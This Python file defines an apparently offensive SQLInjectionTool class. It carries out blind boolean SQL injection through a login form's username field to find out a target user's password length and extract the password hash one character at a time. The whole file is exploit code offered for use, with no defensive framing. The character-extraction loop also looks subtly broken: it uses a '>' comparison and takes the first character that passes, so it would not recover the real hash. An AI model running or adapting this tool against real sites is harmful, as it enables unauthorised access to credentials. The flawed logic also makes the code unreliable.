
import requests
import logging

class SQLInjectionTool:
    def __init__(self, target_url: str, needle: str):
        self.target_url = target_url
        self.needle = needle
        self.total_queries = 0
        self.charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.logger = logging.getLogger(__name__)

    def _injected_query(self, payload: str) -> bool:
        self.total_queries += 1
        response = requests.post(
            self.target_url,
            data={"username": f"admin' and {payload}-- ", "password": "password"},
        )
        return self.needle.encode() not in response.content

    def _boolean_query(self, offset: int, user_id: int, character: str, operator: str = ">") -> bool:
        payload = f"(select hex(substr(password,{offset + 1},1)) from user where id = {user_id}) {operator} hex('{character}')"
        return self._injected_query(payload)

    def _invalid_user(self, user_id: int) -> bool:
        payload = f"(select ID from user where id = {user_id}) >= 0"
        return self._injected_query(payload)

    def _password_length(self, user_id: int) -> int:
        offset = 0
        while True:
            payload = f"(select length(password) from user where id = {user_id} and length(password) <= {offset} limit 1)"
            if not self._injected_query(payload):
                return offset
            offset += 1

    def _extract_hash(self, user_id: int, password_length: int) -> str:
        found = ""
        for offset in range(password_length):
            for char in self.charset:
                if self._boolean_query(offset, user_id, char):
                    found += char
                    break
        return found

    def execute(self, user_id: int):
        if not self._invalid_user(user_id):
            self.logger.info(f"Extracting password hash for User ID: {user_id}")
            password_length = self._password_length(user_id)
            self.logger.info(f"Password length: {password_length}")
            password_hash = self._extract_hash(user_id, password_length)
            self.logger.info(f"Extracted password hash: {password_hash}")
            self.logger.info(f"Total Queries Made: {self.total_queries}")
            return password_hash
        else:
            self.logger.error(f"User ID {user_id} does not exist!")
            return None
